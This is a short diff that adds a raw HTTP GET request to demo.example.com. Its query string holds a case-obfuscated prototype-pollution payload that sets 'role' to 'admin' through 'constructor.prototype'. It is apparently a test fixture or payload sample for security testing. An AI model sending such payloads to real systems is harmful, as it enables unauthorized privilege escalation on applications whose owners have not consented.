@@ -1,0 +1,4 @@
+GET /a?id={"cOnStRuCtOr":{"PrOtOtYpE":{"rOlE":"aDmIn"}}} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
